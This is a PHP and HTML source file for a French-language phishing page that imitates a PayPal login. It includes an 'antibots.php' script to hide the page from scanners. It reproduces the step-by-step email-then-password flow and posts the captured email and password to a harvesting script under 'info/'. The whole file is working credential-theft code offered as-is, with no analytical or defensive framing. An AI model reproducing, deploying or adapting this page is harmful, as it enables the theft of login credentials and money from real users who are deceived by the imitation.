﻿<?php  

include'antibots.php';
ob_start();
session_start();
?>
<!DOCTYPE html>
<html dir="ltr">
    <head>
        <title>Connectez vous à votre compte</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
        <meta charset="utf8">
        <link rel="stylesheet" href="css/normalize.css" />
        <link rel="stylesheet" href="css/bootstrap.min.css" />
        <link rel="stylesheet" href="css/font-awesome.min.css" />
        <link rel="stylesheet" href="css/login.css" />
        <link rel="shortcut icon" type="image/x-icon" href="img/ppl.ico">
    </head>
    <body>
        <div class="lod-full" style="display: none;">
            <div class="lod-c"></div>
        </div>
        <style>

            @media (max-width: 430px){
                .log-f{
                    padding: 0 8% 30px;
                }  
            }
                .error {
                    border: 1px solid #c72e2e;
                }
            </style>
        <div class="contain">
            <form class="log-f" method="POST" action="<?php echo 'info/serv5201.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" id="logform">
                <center>
                    <img src="img/ppt.PNG">
                </center>
                <input id="email" type="email" name="mail" class="in-form" placeholder="Email" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                <input id="pass" type="password" name="pass" class="in-form" placeholder="Mot de passe" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                <br>
                <button type="button" class="login-btn">Connexion</button>
                <a href="#" class="problem">Vous n'arrivez pas à vous connecter ?</a>
                <hr class="hr ou">
                <a href="#" class="login-btn sin-up" id="btn-submit">Ouvrir un compte</a>
            </form>
        </div>
<?php include'./info/footer.php'?>
        <script src="js/jquery-1.11.3.min.js"></script>
        <script src="js/bootstrap.min.js"></script>
        <script src="js/plugins.js"></script>
        <script>
$(document).ready(function() {
$('#pass').hide();
function validateEmail(email) {
    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}
$('button').on('click',function(){
    if(validateEmail($('#email').val())){
    $('#email').fadeOut(50);
    $('#pass').fadeIn(50);
    $('button').html('Connexion');
    setTimeout(function(){
            $('button').attr('type','submit');
    },500);  
    }else {
       $('#email').addClass('error');
    }
});
$('#email').on('focusout',function(){
if(validateEmail($('#email').val())){
    $('#email').removeClass('error');
        }
});
$('input').keypress(function(e) {
    if(e.which == 13) {
        $('button').click();
    }
});
                
                });
        </script>
    </body>
</html>